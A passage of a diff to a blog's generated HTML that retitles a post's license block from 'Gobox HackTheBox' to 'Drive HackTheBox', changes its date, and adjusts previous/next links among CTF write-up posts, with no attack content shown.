-      <div>http://aurey7.github.io.git/2023/09/19/Gobox-HackTheBox/</div>
+      <div>Drive HackTheBox</div>
+      <div>http://aurey7.github.io.git/2023/10/22/Drive-HackTheBox/</div>
     </div>
     <div class="license-meta">
       
@@ -405,7 +415,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月19日</div>
+          <div>2023年10月22日</div>
         </div>
       
       
@@ -437,18 +447,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/22/Drive-HackTheBox/" title="Drive HackTheBox">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Drive HackTheBox</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/17/Epsilon-HackTheBox/" title="Epsilon HackTheBox">
-                        <span class="hidden-mobile">Epsilon HackTheBox</span>
+                      <a href="/2023/09/19/Gobox-HackTheBox/" title="Gobox-HackTheBox">
+                        <span class="hidden-mobile">Gobox-HackTheBox</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
